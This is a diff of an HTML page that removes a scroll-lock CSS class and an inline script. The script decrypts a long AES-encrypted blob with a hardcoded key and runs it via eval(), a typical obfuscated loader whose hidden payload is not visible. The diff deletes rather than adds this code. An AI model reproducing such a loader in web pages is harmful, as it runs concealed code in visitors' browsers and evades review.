@@ -48,10 +48,6 @@
             cursor: pointer;
           }
 
-          /* CSS to prevent scrolling */
-          .scroll-lock {
-            overflow: hidden;
-          }
 
           /* Black text for modal heading and description */
           .modal-content h2, .modal-content p {
@@ -145,31 +141,7 @@
 					}
 				  });
 				</script>
-				<script>
-				  let secretKey = 'bruceisgenius';
-				  
-				  function aesDecode(encodedText) {
-					  if (!secretKey) {
-						  throw new Error("Secret key is not available yet. Make sure it's fetched before calling this function.");
-					  }
-					  const decodedText = decodeURIComponent(encodedText);
-					  const bytes = CryptoJS.AES.decrypt(decodedText, secretKey);
-					  return bytes.toString(CryptoJS.enc.Utf8);
-				  }
-				// Decode and safely evaluate the decrypted script
-  try {
-	const decryptedScript = aesDecode(`U2FsdGVkX1%2Fg1XENmvCRnisszm%2BHivn06fHFpGJtta%2BhkeCZWrQahKp1wJL1BPBlttDRGR17e5SLDFtoZ9BPL9fS0erwLLoSRlllwRklp2rN4hng6eoBN%2Bf3HYCcVluaTo3lqP6mVzMdM2nSLVa7fV%2BGEOpl8mVb5thBQMduz7R0ZZH68UheBwwGdsuMiFg7AmVCWJfIdO8OldcwsGmWGsLNscccZpEZ8bNEJojWSKWHWuySPONGu1pBhBV8wNORbdne3wVcj4RZ%2B8vmB0aIz0Ybg%2FbQvjTkfcyBmv%2FuTETIdqA7%2BlIupq4AmE2p6FEgV9yxFXWpgybIJZkuK%2BaS7%2BudtvhJwnCPkPrOhCAgm2XTxCvYX%2FL0WbcBJ%2BHkY0FCGSFbdU6XDNzuKoxgpTHH2PK8AByFF%2BgwLklAaKp6jWuO9DHgv%2Bn%2F4q4ApJ4e8ItbUPOByaMU8n0Gacsz6HOpo52zg2FyhSteelUg7nURYNOCNpd7ldPj6xeRXeahK%2BexeKheQDQxCkvYP6iXd18mKenO7OI8OJ4xTC%2F7LzDBqNw9osB8pI9%2Bz1wsSYXVz7B%2BA7KniN08hHC5lbxBP2E1Ek7%2Bywxzd6oCQZKy7smehJPr60r3pqTS9b7FD%2FxolmWOyG8Xtykg1noRvtafo55ArQfMIOFnb5q06DUIY0zT1yLqQlQxH6COBqEpNj8wFCaXgEo8Za3CYZcjUIpFNPr9A%2FlropWWh0eoP0yeqwtI4bsGiCl3WBO2KAM1Y6hiUErcs81%2FoB%2FpPITF%2FNVxUFijsDbL6jdVnE1Dd44%2FtgLqLiGUyvhL5j12IN%2BXWVWTgzETQcHpX8d8WytRp1ve8pp9Z5L7hgsEI0%2FED4MajzFHWDE2s%2FqfwvN3acB5rC0XgJk2aMtBSNASJ4VOiaYRObpwJPaNXWjg9orjMPqTEPOZp3WZuDQmHSEyheJm%2F8kfC3Ok4jZE6fegBGVCTGqB0bnA7kdNCxNBbOM6ljkb1Ry2WSzScoRy3ufWwYACzEj6cXb%2F%2FUv%2BHXXFzyVM6x9VeeSSyVJ15gKk9qzZ913bcY48r02A1y236lCuab7iJLLB1cLYJWg0bwrNWoLQqSeWoy4NVB%2BEgue48KF2oK9pveUpCkv%2F9iaLDAtp7r2Kj%2F5n%2BzdkccSL4nqBOknZzA257Man0vYXDXrfAG9QFqIs9HEB2kcgMGeHLxpQY9EaBW9ccMlH6L5atluAj59AQq3nf2jVb5L5fGqjxRUQ19tY0ketHu%2B%2Fc0L0lGIKOZI%2FOMUEEX5%2FRM%2FDungilgqDVcIZ%2BwhyY7cZkG6EAzR21j56HpE1WUrfODeXfD176oDwydejFGqiV2XBIxBW3KD200LNpkBSFiI4iHYBxeQx6AkVB7yrahKfobMXtegIvvvsnAL37w%2FuuFNJvnAzVMXVpOsD2%2FubmIXxXxZT5xSAN9gqacCAzVGHU4DC9fChSNFsBRLQzSWIIG69%2Fj%2FN28kKYQjc%2F12HPSn9MB%2FfC%2BjCq8%2FYLaB8cHXMfD2PHjC96cQ5wNXv62nmyBP2ilnjkxxRlCg420Pdp9Ssb0nvsbupOF9zm7qMUdmreTAIFJVxQrYiGSWaY%2BQgL25onw1PJGzk9LtxWcAfggFLsML84wV6MZNvK%2FFITNHGe4q2ImbzAF%2FXwHtj9VlAqFtiNmWRT7OqGBAPPUHmmZutxxAY%2BH5nZKHqdt0L%2FINTjPgr7EVxfpf90W%2FYRnmAdA570oSZ%2FUmudcpx1jlrGw%3D%3D`);
-      // Check if the decrypted script is valid JavaScript
-      if (decryptedScript.trim().startsWith('<')) {
-          throw new Error("Decrypted script appears to contain HTML, not JavaScript.");
-      }
-
-      // Evaluate the script only if it passes the validation
-      eval(decryptedScript);
-  } catch (error) {
-      console.error("Error executing decrypted script:", error);
-  }
-				</script>
+				
 			</div>
 	</body>
 </html>
